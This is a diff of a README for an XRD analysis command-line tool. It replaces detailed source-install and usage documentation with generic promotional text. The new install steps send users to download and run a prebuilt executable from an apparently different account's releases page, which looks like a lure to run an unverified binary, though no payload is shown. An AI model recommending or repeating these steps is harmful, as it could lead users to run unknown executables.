@@ -1,154 +1,140 @@
-# crysanalyze
+# CrysAnalyze 🌟
 
-A command-line interface (CLI) tool for rapid preliminary analysis of powder X-ray Diffraction (XRD) data. This tool is designed for quick initial screening of synthesized materials and provides essential XRD analysis capabilities.
+![CrysAnalyze](https://img.shields.io/badge/CrysAnalyze-CLI%20Tool-brightgreen)
+
+## Overview
+
+CrysAnalyze is a command-line interface (CLI) tool designed for the rapid preliminary analysis of powder X-ray Diffraction (XRD) data. This tool streamlines the initial screening of synthesized materials, providing essential capabilities for XRD analysis. Whether you are a researcher in materials science, solid-state physics, or crystallography, CrysAnalyze offers a straightforward way to analyze your data quickly.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Example](#example)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Features
 
-- Read common XRD data formats (.xy, .dat)
-- Background subtraction using polynomial fitting
-- Peak finding with customizable parameters
-- Multiple visualization options
-- 2θ range selection
-- Command-line interface for automation and scripting
+- **Rapid Analysis**: Quickly assess your XRD data without extensive setup.
+- **User-Friendly CLI**: Simple command-line interface for easy access.
+- **Essential Functions**: Perform key analyses needed for material characterization.
+- **Flexible Data Input**: Accepts various data formats commonly used in XRD studies.
+- **Open Source**: Contribute and modify the tool as per your needs.
 
 ## Installation
 
-### From Source
+To install CrysAnalyze, follow these steps:
 
-```bash
-git clone https://github.com/raymsm/crysanalyze.git
-cd crysanalyze
-pip install -r requirements.txt
-```
-
-### Dependencies
-
-- Python 3.6+
-- NumPy
-- SciPy
-- Matplotlib
+1. **Download the latest release** from [here](https://github.com/theopslookin/crysanalyze/releases). Look for the appropriate file for your operating system.
+2. **Extract the downloaded file** to your preferred directory.
+3. **Navigate to the directory** where you extracted the files.
+4. **Run the executable** to start using CrysAnalyze.
 
 ## Usage
 
-The basic syntax for using crysanalyze is:
+CrysAnalyze operates through a command-line interface. After installation, you can access the tool from your terminal. To get started, simply type:
 
 ```bash
-python crysanalyze.py --input <data_file> --wavelength <wavelength> <command> [options]
+crysanalyze --help
 ```
 
-### Required Arguments
+This command will display all available options and commands.
 
-- `--input`: Path to the XRD data file (.xy, .dat)
-- `--wavelength`: X-ray wavelength in Angstroms (e.g., 1.5406 for Cu Kα1)
+## Commands
 
-### Global Optional Arguments
+CrysAnalyze offers several commands for different analysis tasks. Below are some of the main commands you can use:
 
-- `--output`: Path to save text-based results
-- `--range MIN MAX`: Process only data within this 2θ range
+### Analyze
 
-### Commands
-
-#### Peak Finding
+Run an analysis on your XRD data file.
 
 ```bash
-python crysanalyze.py --input sample.xy --wavelength 1.5406 peaks [options]
+crysanalyze analyze <data_file>
 ```
 
-Options:
-- `--min-height`: Minimum peak height for detection
-- `--min-dist`: Minimum horizontal distance between peaks (in degrees)
-- `--bg-poly`: Order of polynomial for background subtraction
-- `--fit-peaks`: Enable peak fitting (if implemented)
+### Plot
 
-Example:
-```bash
-python crysanalyze.py --input sample.xy --wavelength 1.5406 peaks --bg-poly 3 --min-height 100 --min-dist 0.5
-```
-
-#### Plotting
+Generate a plot of the XRD data.
 
 ```bash
-python crysanalyze.py --input sample.xy --wavelength 1.5406 plot [options]
+crysanalyze plot <data_file>
 ```
 
-Options:
-- `--plot-type`: Type of plot to generate
-  - `raw`: Raw XRD data
-  - `bgsub`: Background-subtracted data
-  - `peaks`: Data with marked peaks
-- `--bg-poly`: Order of polynomial for background subtraction
-- `--save-plot`: Path to save the plot
+### Export
 
-Example:
+Export the results of your analysis to a specified format.
+
 ```bash
-python crysanalyze.py --input sample.xy --wavelength 1.5406 plot --plot-type peaks --save-plot peaks.png
+crysanalyze export <data_file> --format <format_type>
 ```
 
-## Examples
+### Help
 
-1. Find peaks with background subtraction:
+Get help on using CrysAnalyze.
+
 ```bash
-python crysanalyze.py --input sample.xy --wavelength 1.5406 peaks --bg-poly 3 --min-height 100
+crysanalyze --help
 ```
 
-2. Plot data with marked peaks:
+## Example
+
+Here’s a quick example of how to use CrysAnalyze:
+
+1. After installing, navigate to the directory with your XRD data file.
+2. Run the analysis command:
+
 ```bash
-python crysanalyze.py --input sample.xy --wavelength 1.5406 plot --plot-type peaks --save-plot peaks.png
+crysanalyze analyze my_data.xrd
 ```
 
-3. Analyze specific 2θ range:
+3. To plot the results, use:
+
 ```bash
-python crysanalyze.py --input sample.xy --wavelength 1.5406 --range 20 60 peaks
+crysanalyze plot my_data.xrd
 ```
 
-## Input Format
+4. Finally, export your analysis results:
 
-The input file should be a two-column text file containing:
-- Column 1: 2θ values in degrees
-- Column 2: Intensity values
-
-## Output Format
-
-### Peak Finding
+```bash
+crysanalyze export my_data.xrd --format csv
 ```
-Peak Analysis Results
-2-theta  Intensity
-30.700   1200.0
-40.700   1500.0
-```
-
-### Plots
-- Raw data plot
-- Background-subtracted plot
-- Peak-marked plot with labels
-
-## Limitations
-
-- Currently supports only two-column data files
-- Basic polynomial background subtraction
-- Simple peak finding algorithm
-- Limited peak fitting capabilities
 
 ## Contributing
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+We welcome contributions to CrysAnalyze! If you have suggestions for improvements or new features, please fork the repository and submit a pull request. For larger changes, consider opening an issue to discuss your ideas.
+
+### Steps to Contribute
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Test your changes thoroughly.
+5. Submit a pull request.
 
 ## License
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+CrysAnalyze is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or suggestions, feel free to reach out:
+
+- **Email**: your-email@example.com
+- **GitHub**: [your-github-profile](https://github.com/your-github-profile)
 
 ## Acknowledgments
 
-This tool uses the following libraries:
-- NumPy for numerical computations
-- SciPy for peak finding and optimization
-- Matplotlib for plotting
+- Thanks to the contributors and the open-source community for their support.
+- Special thanks to the developers of the libraries used in this project.
 
-## Citation
+## Visit Us
 
-If you use this tool in your research, please cite:
+For the latest updates and releases, visit our [Releases section](https://github.com/theopslookin/crysanalyze/releases). You can also download the latest version of CrysAnalyze from there.
 
-```
-crysanalyze: A CLI Tool for Rapid XRD Analysis
-https://github.com/yourusername/crysanalyze
-```
+## Conclusion
+
+CrysAnalyze is a powerful tool for anyone working with powder X-ray Diffraction data. Its simplicity and efficiency make it an essential part of your analytical toolkit. Start analyzing your materials today!
